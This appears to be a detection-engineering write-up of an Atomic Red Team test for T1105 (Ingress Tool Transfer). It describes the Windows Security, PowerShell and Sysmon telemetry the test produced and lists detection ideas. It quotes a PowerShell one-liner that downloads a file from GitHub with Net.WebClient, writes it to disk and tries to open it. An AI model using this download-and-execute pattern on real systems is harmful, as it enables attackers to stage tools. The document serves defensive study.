# T1105-15: Ingress Tool Transfer — File Download via PowerShell

## Technique Context

T1105 (Ingress Tool Transfer) represents one of the most fundamental command-and-control techniques where adversaries transfer tools or files from an external system into a compromised environment. This specific test demonstrates the classic PowerShell file download pattern using `System.Net.WebClient.DownloadString()`, which is frequently observed in initial access scenarios, post-exploitation tool staging, and payload deployment phases. The detection community focuses heavily on monitoring PowerShell invocations of .NET web classes, suspicious file writes to temporary directories, and network connections to external file hosting services like GitHub's raw content CDN. This technique is particularly significant because it represents a common pivot point where attackers move from initial compromise to tool deployment.

## What This Dataset Contains

This dataset captures a complete PowerShell-based file download execution with excellent telemetry coverage. The Security channel shows the full process creation chain starting with Security EID 4688 for powershell.exe with the complete command line: `"powershell.exe" & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}`. The PowerShell channel provides rich script block logging (EID 4104) showing the malicious script content and command invocation details (EID 4103) for `New-Object` with TypeName "Net.WebClient" and `Out-File` with the downloaded content. Sysmon captures the complete process tree with EID 1 events for both powershell.exe instances, DNS resolution to raw.githubusercontent.com (EID 22), file creation of LICENSE.txt in C:\Windows\Temp\ (EID 11), and multiple DLL load events (EID 7) showing .NET framework components and urlmon.dll loading to support web operations. The dataset also shows a failed Invoke-Item attempt with PowerShell errors (EID 4102, 4100) indicating the technique succeeded in downloading but failed in execution.

## What This Dataset Does Not Contain

The dataset lacks network connection telemetry that would show the actual HTTPS connection to GitHub's servers, likely because Sysmon's network connection logging didn't capture this specific connection or the connection was filtered. There are no Windows Defender detection events despite active real-time protection, suggesting this benign file download didn't trigger behavioral signatures. The dataset doesn't contain any registry modifications or additional persistence mechanisms that might accompany more sophisticated ingress tool transfer scenarios. File content analysis or hash-based detection events are also absent, which would be present in environments with more aggressive content inspection capabilities.

## Assessment

This dataset provides excellent detection engineering value for T1105 scenarios. The combination of command-line auditing in Security events, detailed PowerShell script block logging, and Sysmon process/file creation events creates multiple overlapping detection opportunities. The PowerShell telemetry is particularly valuable, capturing both the script content and individual cmdlet invocations that enable fine-grained behavioral detection. The DNS query logging adds network context, while file creation events provide the outcome evidence. The dataset effectively demonstrates the complete attack flow from command execution through file staging, making it ideal for testing detections across multiple data sources and building correlation rules that combine process, network, and file system evidence.

## Detection Opportunities Present in This Data

1. **PowerShell Web Client Object Creation** - Monitor PowerShell EID 4103 for New-Object cmdlets with TypeName "Net.WebClient" or similar web download classes
2. **Suspicious PowerShell Script Blocks** - Detect EID 4104 script blocks containing "DownloadString", "Net.WebClient", or other web download methods combined with file output operations
3. **PowerShell Process with External URLs** - Alert on Security EID 4688 powershell.exe processes where command lines contain URLs to external file hosting services
4. **File Creation in Temporary Directories** - Monitor Sysmon EID 11 for file creation in %TEMP%, C:\Windows\Temp, or user temp directories by PowerShell processes
5. **DNS Queries to File Hosting Services** - Detect Sysmon EID 22 DNS queries to known file hosting domains like raw.githubusercontent.com, especially from PowerShell processes
6. **PowerShell Process Chain Analysis** - Correlate Sysmon EID 1 events showing PowerShell spawning child PowerShell processes with download-related command lines
7. **URLMon DLL Loading in PowerShell** - Monitor Sysmon EID 7 for urlmon.dll loads in PowerShell processes as an indicator of web activity
8. **Failed Execution After Download** - Combine file creation events with subsequent PowerShell error events (EID 4102/4100) to identify successful downloads with failed execution attempts
